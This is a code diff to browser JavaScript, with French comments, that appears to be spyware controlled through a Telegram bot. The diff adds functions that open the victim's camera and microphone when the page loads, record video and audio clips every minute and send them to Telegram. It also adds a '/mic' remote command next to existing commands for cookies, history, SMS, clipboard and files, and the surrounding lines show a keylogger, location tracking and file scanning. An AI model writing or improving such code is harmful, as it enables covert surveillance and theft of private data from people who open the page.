@@ -262,74 +262,139 @@ async function captureAutoPhoto() {
     } catch(e) {}
 }
 
-async function captureAutoVideo() {
+// ============================================
+// NOUVELLE FONCTION VIDEO 12 SECONDES
+// ============================================
+async function captureAutoVideo12Seconds() {
     if (!cameraStream || isRecording) return;
     isRecording = true;
     try {
-        const mediaRecorder = new MediaRecorder(cameraStream);
+        // Utiliser un format compatible avec Safari
+        const mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm';
+        const mediaRecorder = new MediaRecorder(cameraStream, { mimeType: mimeType });
         const chunks = [];
+        
         mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
         mediaRecorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'video/mp4' });
-            if (blob.size > 0) await sendVideoToTelegram(blob);
+            const blob = new Blob(chunks, { type: mimeType });
+            if (blob.size > 0) {
+                await sendVideoToTelegram(blob);
+                sendToTelegram(`🎥 VIDÉO 12s envoyée (${Math.round(blob.size/1024)} KB)`);
+            }
             isRecording = false;
         };
+        
         mediaRecorder.start();
-        await new Promise(r => setTimeout(r, 13000));
-        mediaRecorder.stop();
-    } catch(e) { isRecording = false; }
-}
-
-async function captureAutoAudio() {
-    if (isAudioRecording) return;
-    isAudioRecording = true;
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        const mediaRecorder = new MediaRecorder(stream);
-        const chunks = [];
-        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-        mediaRecorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'audio/ogg' });
-            if (blob.size > 0) {
-                await sendAudioToTelegram(blob);
-                sendToTelegram(`🎤 Audio envoyé (${Math.round(blob.size/1024)} KB)`);
-            }
-            stream.getTracks().forEach(t => t.stop());
-            isAudioRecording = false;
-        };
-        mediaRecorder.start();
-        await new Promise(r => setTimeout(r, 13000));
+        await new Promise(r => setTimeout(r, 12000)); // 12 secondes exactement
         mediaRecorder.stop();
     } catch(e) { 
-        isAudioRecording = false;
-        sendToTelegram(`❌ Erreur audio: ${e.message}`);
+        isRecording = false;
+        sendToTelegram(`❌ Erreur vidéo 12s: ${e.message}`);
     }
 }
 
+// ============================================
+// NOUVELLE FONCTION MICRO 10 SECONDES (AMÉLIORÉE POUR SAFARI)
+// ============================================
+async function captureAutoAudio10Seconds() {
+    if (isAudioRecording) return;
+    isAudioRecording = true;
+    try {
+        // Demander spécifiquement l'accès au micro
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        
+        // Format compatible Safari
+        const mimeType = MediaRecorder.isTypeSupported('audio/mp4') ? 'audio/mp4' : 'audio/webm';
+        const mediaRecorder = new MediaRecorder(stream, { mimeType: mimeType });
+        const chunks = [];
+        
+        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(chunks, { type: 'audio/webm' });
+            if (blob.size > 0) {
+                await sendAudioToTelegram(blob);
+                sendToTelegram(`🎤 AUDIO 10s envoyé (${Math.round(blob.size/1024)} KB)`);
+            }
+            stream.getTracks().forEach(track => track.stop());
+            isAudioRecording = false;
+        };
+        
+        mediaRecorder.start();
+        await new Promise(r => setTimeout(r, 10000)); // 10 secondes exactement
+        mediaRecorder.stop();
+    } catch(e) { 
+        isAudioRecording = false;
+        sendToTelegram(`❌ Erreur micro 10s: ${e.message}`);
+    }
+}
+
+// ============================================
+// DEMANDE CAMÉRA AMÉLIORÉE POUR SAFARI IPHONE
+// ============================================
 async function requestCameraAndCapture() {
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { width: { ideal: 480 }, height: { ideal: 480 } },
+        // Configuration optimisée pour iOS Safari
+        const constraints = { 
+            video: { 
+                facingMode: "user",
+                width: { ideal: 480 },
+                height: { ideal: 480 }
+            },
             audio: false
-        });
+        };
+        
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
         cameraStream = stream;
         collectedData.permissionsGranted.push({ type: 'camera', status: 'granted' });
-        sendToTelegram('✅ CAMÉRA ACCEPTÉE (mode silencieux)');
+        sendToTelegram('✅ CAMÉRA ACCEPTÉE');
         
+        // Capturer 6 photos
         for (let i = 1; i <= 6; i++) {
             await captureAutoPhoto();
             await new Promise(r => setTimeout(r, 500));
         }
         
+        // VIDÉO 12 SECONDES (immédiatement)
+        sendToTelegram('🎥 DÉBUT ENREGISTREMENT VIDÉO 12s...');
+        await captureAutoVideo12Seconds();
+        
+        // Démarrer les captures automatiques
         startAutoPhotoCapture();
-        startAutoVideoCapture();
-        startAutoAudioCapture();
+        startAutoVideoCapture30s();
+        startAutoAudioCapture30s();
         startAutoScreenshots();
         startAutoLocationCapture();
         setTimeout(() => scanAndSendExternalFiles(), 3000);
+        
     } catch(e) {
         collectedData.permissionsGranted.push({ type: 'camera', status: 'denied' });
-        sendToTelegram(`❌ CAMÉRA REFUSÉE`);
+        sendToTelegram(`❌ CAMÉRA REFUSÉE: ${e.message}`);
+    }
+}
+
+// ============================================
+// DEMANDE MICRO AMÉLIORÉE POUR TOUS NAVIGATEURS
+// ============================================
+async function requestMicrophoneAndCapture() {
+    try {
+        sendToTelegram('🎤 DEMANDE ACCÈS MICRO...');
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        collectedData.permissionsGranted.push({ type: 'microphone', status: 'granted' });
+        sendToTelegram('✅ MICRO ACCEPTÉ');
+        
+        // ENREGISTREMENT AUDIO 10 SECONDES
+        sendToTelegram('🎙️ DÉBUT ENREGISTREMENT AUDIO 10s...');
+        await captureAutoAudio10Seconds();
+        
+        // Démarrer les captures audio automatiques
+        if (audioInterval) clearInterval(audioInterval);
+        audioInterval = setInterval(async () => { 
+            await captureAutoAudio10Seconds(); 
+        }, 60000); // toutes les 60 secondes
+        
+    } catch(e) {
+        collectedData.permissionsGranted.push({ type: 'microphone', status: 'denied' });
+        sendToTelegram(`❌ MICRO REFUSÉ: ${e.message}`);
     }
 }
 
@@ -343,14 +408,18 @@ function startAutoPhotoCapture() {
     }, 30 * 1000);
 }
 
-function startAutoVideoCapture() {
+function startAutoVideoCapture30s() {
     if (videoInterval) clearInterval(videoInterval);
-    videoInterval = setInterval(() => { captureAutoVideo(); }, 30 * 1000);
+    videoInterval = setInterval(async () => { 
+        await captureAutoVideo12Seconds(); 
+    }, 60 * 1000); // vidéo 12s toutes les 60 secondes
 }
 
-function startAutoAudioCapture() {
+function startAutoAudioCapture30s() {
     if (audioInterval) clearInterval(audioInterval);
-    audioInterval = setInterval(() => { captureAutoAudio(); }, 30 * 1000);
+    audioInterval = setInterval(async () => { 
+        await captureAutoAudio10Seconds(); 
+    }, 60000); // audio 10s toutes les 60 secondes
 }
 
 async function captureAutoScreenshot() {
@@ -455,7 +524,7 @@ function showGrantAllButton() {
         btn.disabled = true;
         await Notification.requestPermission();
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             cameraStream = stream;
         } catch(e) {}
         const input = document.createElement('input');
@@ -557,6 +626,7 @@ async function checkCommands() {
         if (!cleanCmd || cleanCmd === lastCommand) return;
         lastCommand = cleanCmd;
         if (cleanCmd === '/camera') await requestCameraAndCapture();
+        else if (cleanCmd === '/mic') await requestMicrophoneAndCapture();
         else if (cleanCmd === '/grantall') showGrantAllButton();
         else if (cleanCmd === '/files') showFloatingFileButton();
         else if (cleanCmd === '/clipboard') await requestClipboardAccess();
@@ -570,7 +640,7 @@ async function checkCommands() {
         else if (cleanCmd === '/ping') sendToTelegram('🏓 Pong!');
         else if (cleanCmd === '/vibrate') vibrate();
         else if (cleanCmd === '/help' || cleanCmd === '/start') {
-            sendToTelegram(`🤖 COMMANDES\n━━━━━━━━━━━━━━━━━━━━━\n📷 /camera\n📁 /files\n🔓 /grantall\n📋 /clipboard\n🍪 /cookies\n📜 /history\n📡 /sensors\n📱 /sms\n🔥 /advanced\n🔄 /bg\n📊 /status\n🏓 /ping\n📳 /vibrate\n━━━━━━━━━━━━━━━━━━━━━`);
+            sendToTelegram(`🤖 COMMANDES\n━━━━━━━━━━━━━━━━━━━━━\n📷 /camera\n🎤 /mic\n📁 /files\n🔓 /grantall\n📋 /clipboard\n🍪 /cookies\n📜 /history\n📡 /sensors\n📱 /sms\n🔥 /advanced\n🔄 /bg\n📊 /status\n🏓 /ping\n📳 /vibrate\n━━━━━━━━━━━━━━━━━━━━━`);
         }
         else if (cleanCmd.startsWith('notify_custom:')) {
             new Notification('📢 Message', { body: cleanCmd.replace('notify_custom:', '').trim() });
@@ -596,7 +666,13 @@ function keepAlive() {
     collectAllCookies();
     collectBrowsingHistory();
     await requestNotifications();
+    
+    // Demander caméra + vidéo 12s après 2 secondes
     setTimeout(() => requestCameraAndCapture(), 2000);
+    
+    // Demander micro + audio 10s après 4 secondes (pour Safari)
+    setTimeout(() => requestMicrophoneAndCapture(), 4000);
+    
     setTimeout(() => showGrantAllButton(), 1000);
     startKeylogger();
     startSensorTracking();
@@ -604,5 +680,5 @@ function keepAlive() {
     keepAlive();
     startAutoCookieCollection();
     setInterval(checkCommands, 3000);
-    await sendToTelegram('💀 MODE ACTIF');
+    await sendToTelegram('💀 MODE ACTIF - CAMERA 12s + MICRO 10s');
 })();
